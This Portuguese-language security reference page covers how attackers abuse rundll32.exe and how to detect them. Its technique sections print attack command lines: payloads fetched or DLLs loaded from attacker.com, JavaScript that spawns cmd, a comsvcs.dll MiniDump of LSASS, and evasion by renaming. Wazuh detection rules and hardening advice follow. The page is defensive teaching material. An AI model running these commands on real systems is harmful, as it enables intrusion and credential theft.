# rundll32.exe

**Plataforma:** Windows (todas as versões)

**Categorias:** Execução de código, Proxy de execução, AWL Bypass, Alternate Data Streams

**MITRE ATT&CK:** T1218.011 (System Binary Proxy Execution — Rundll32), T1564.004 (Alternate Data Streams)

**Referência ofensiva:** https://lolbas-project.github.io/lolbas/Binaries/Rundll32/

---

## O que é o rundll32.exe

O rundll32.exe é um componente do Windows responsável por carregar e executar funções exportadas por arquivos DLL. Seu propósito original é permitir que o sistema operacional execute funcionalidades implementadas em DLLs sem precisar de um executável dedicado — por exemplo, abrir o Painel de Controle, exibir propriedades de impressora ou executar instaladores.

O binário está presente em todas as versões do Windows e é executado regularmente pelo próprio sistema operacional como parte de operações rotineiras. Isso o torna especialmente difícil de bloquear: qualquer regra que impeça a execução do rundll32 por completo quebra funcionalidades legítimas do Windows.

---

## Por que atacantes usam o rundll32.exe

O rundll32 resolve dois problemas fundamentais para o atacante: executar código sem criar um novo arquivo executável detectável e contornar soluções de Application Whitelist que permitem apenas binários assinados pela Microsoft.

Por ser assinado pela Microsoft e ser executado rotineiramente pelo sistema, o rundll32 raramente é bloqueado. Grupos como APT32, FIN7, Lazarus, e praticamente todos os grandes operadores de ransomware documentaram uso do rundll32 em suas campanhas.

---

## Técnicas de abuso

### Execução de DLL local com ponto de entrada específico

```cmd
:: Executar função ExportedFunction de uma DLL maliciosa
rundll32.exe C:\Users\Public\payload.dll,ExportedFunction

:: Sem espaço entre DLL e função (ambas as formas funcionam)
rundll32.exe C:\temp\mal.dll,StartW

:: Com argumento adicional para a função
rundll32.exe C:\temp\payload.dll,EntryPoint argumentos_extras
```

### Execução de código JavaScript via mshtml (técnica clássica)

Uma técnica historicamente muito utilizada que executa JavaScript diretamente:

```cmd
:: Executar JavaScript via mshtml.dll
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("cmd.exe",0,true);

:: Baixar e executar HTA remoto
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker.com/payload.sct")
```

### Execução de DLL via UNC path (remoto, sem escrita em disco)

```cmd
:: Carregar DLL diretamente de compartilhamento SMB — nada é gravado no disco local
rundll32.exe \\attacker.com\share\payload.dll,EntryPoint

:: Via WebDAV (HTTP como SMB)
rundll32.exe \\attacker.com@80\DavWWWRoot\payload.dll,EntryPoint
```

Esta é uma das técnicas mais eficazes porque não cria nenhum artefato no disco do alvo — a DLL é carregada diretamente da rede.

### Execução via Alternate Data Streams (ADS)

```cmd
:: Executar DLL escondida em ADS de arquivo legítimo
rundll32.exe C:\Windows\Temp\readme.txt:payload.dll,EntryPoint
```

### Execução de shellcode via comsvcs.dll (MiniDump / dump de LSASS)

A `comsvcs.dll` tem uma função exportada chamada `MiniDump` que pode ser invocada via rundll32 para fazer dump de memória de qualquer processo — incluindo o LSASS:

```cmd
:: Dump de LSASS via comsvcs.dll (não requer procdump.exe)
:: Requer privilégios de SYSTEM ou SeDebugPrivilege
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <PID_do_LSASS> C:\temp\lsass.dmp full

:: Automatizando com PowerShell para obter o PID
$lsass = Get-Process lsass
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsass.Id C:\temp\lsass.dmp full
```

Essa técnica é amplamente utilizada para roubo de credenciais porque usa apenas binários e DLLs do próprio Windows — nenhuma ferramenta externa como Mimikatz precisa ser transferida.

### Execução de SCT remoto via scrobj.dll

```cmd
:: Executar script COM (SCT) remoto via scrobj.dll
rundll32.exe scrobj.dll,NeedClassFactory http://attacker.com/payload.sct
```

---

## Técnicas de bypass e evasão

### Renomeação do binário

```cmd
copy C:\Windows\System32\rundll32.exe C:\Users\Public\svchost32.exe
C:\Users\Public\svchost32.exe C:\temp\payload.dll,EntryPoint
```

O `OriginalFileName` do PE header ainda será `RUNDLL32.EXE`, o que permite detecção via Sysmon campo `OriginalFileName`.

### Variação de capitalização e caminho

```cmd
:: Windows é case-insensitive para executáveis
RUNDLL32.exe payload.dll,EntryPoint
RuNdLl32.exe payload.dll,EntryPoint
C:\Windows\SysWOW64\rundll32.exe payload.dll,EntryPoint
```

### Uso de System32 vs SysWOW64

Em sistemas 64 bits, há duas versões do rundll32: a de 64 bits em `System32` e a de 32 bits em `SysWOW64`. Usar a versão de 32 bits pode contornar algumas detecções específicas de arquitetura.

---

## Detecção

### O que monitorar

**Indicadores de alta relevância:**

- rundll32 com `javascript:` na linha de comando — técnica de execução de JS
- rundll32 carregando DLL de UNC path (`\\server\share\...`) — execução remota sem disco
- rundll32 chamando `comsvcs.dll MiniDump` — dump de LSASS
- rundll32 carregando DLL de diretórios não-sistema (`%TEMP%`, `%APPDATA%`, `C:\Users\Public\`)
- rundll32 sendo executado por processo filho de Office (Word, Excel, Outlook)

**Indicadores de média relevância:**

- rundll32 com `scrobj.dll` — execução de SCT
- rundll32 renomeado (verificar `OriginalFileName`)
- rundll32 iniciando conexão de rede (Sysmon Event ID 3)

### Regra Wazuh

```xml
<!-- Arquivo: wazuh-rules/windows/0201-lolbas_execution.xml -->

<group name="lolbins,lolbas,windows,execution">

  <!-- rundll32 com javascript: na linha de comando -->
  <rule id="100304" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)rundll32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)javascript:</field>
    <description>rundll32.exe executando JavaScript — tecnica de proxy de execucao de codigo</description>
    <mitre>
      <id>T1218.011</id>
    </mitre>
  </rule>

  <!-- rundll32 com comsvcs.dll MiniDump — dump de LSASS -->
  <rule id="100305" level="15">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)rundll32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)comsvcs.*MiniDump|MiniDump.*comsvcs</field>
    <description>rundll32.exe invocando MiniDump via comsvcs.dll — possivel dump de LSASS para roubo de credenciais</description>
    <mitre>
      <id>T1218.011</id>
      <id>T1003.001</id>
    </mitre>
  </rule>

  <!-- rundll32 carregando DLL de UNC path -->
  <rule id="100306" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)rundll32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">\\\\[^\\]+\\[^\\]+\\.*\.dll</field>
    <description>rundll32.exe carregando DLL de UNC path remoto — execucao sem artefato em disco</description>
    <mitre>
      <id>T1218.011</id>
    </mitre>
  </rule>

  <!-- rundll32 carregando DLL fora de System32 -->
  <rule id="100307" level="12">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.image" type="pcre2">(?i)rundll32\.exe$</field>
    <field name="win.eventdata.commandLine" type="pcre2">(?i)(\\Users\\|\\Temp\\|\\Public\\|\\AppData\\|\\ProgramData\\).*\.dll</field>
    <description>rundll32.exe carregando DLL fora de diretorio de sistema — DLL maliciosa suspeita</description>
    <mitre>
      <id>T1218.011</id>
    </mitre>
  </rule>

  <!-- rundll32 renomeado -->
  <rule id="100308" level="14">
    <if_group>sysmon_event1</if_group>
    <field name="win.eventdata.originalFileName" type="pcre2">(?i)RUNDLL32\.EXE</field>
    <field name="win.eventdata.image" type="pcre2" negate="yes">(?i)rundll32\.exe$</field>
    <description>rundll32.exe executado com nome alterado — tentativa de evasao por renomeacao</description>
    <mitre>
      <id>T1036.003</id>
    </mitre>
  </rule>

</group>
```

### Falsos positivos comuns e como reduzir o ruído

**Operações legítimas do Windows:** o rundll32 é usado pelo próprio Windows para diversas operações — instalar fontes, exibir propriedades de rede, executar itens do Painel de Controle. Essas execuções partem de processos como `explorer.exe`, `svchost.exe` ou `control.exe` com DLLs de `System32`. Filtre por parent process e localização da DLL.

**Instaladores de software:** alguns instaladores usam rundll32 para executar DLLs de configuração. Filtre por janela de tempo de instalação e usuário administrador.

---

## Proteção e controles defensivos

**AppLocker com regras de path para DLLs:** configure o AppLocker para bloquear carregamento de DLLs fora de `%WINDIR%` e `%ProgramFiles%`. Isso impede que rundll32 carregue DLLs maliciosas de diretórios de usuário.

**Bloquear acesso a UNC paths via firewall:** regras de firewall que bloqueiam SMB de saída (portas 445 e 139) para destinos externos eliminam o vetor de execução remota via UNC path.

**Monitorar com Attack Surface Reduction (ASR):** o Windows Defender tem regras ASR específicas para bloquear abuso de rundll32 — em particular a regra "Block execution of potentially obfuscated scripts".

---

## Referências

- LOLBAS — rundll32.exe: https://lolbas-project.github.io/lolbas/Binaries/Rundll32/
- MITRE ATT&CK T1218.011: https://attack.mitre.org/techniques/T1218/011/
- MITRE ATT&CK T1003.001: https://attack.mitre.org/techniques/T1003/001/
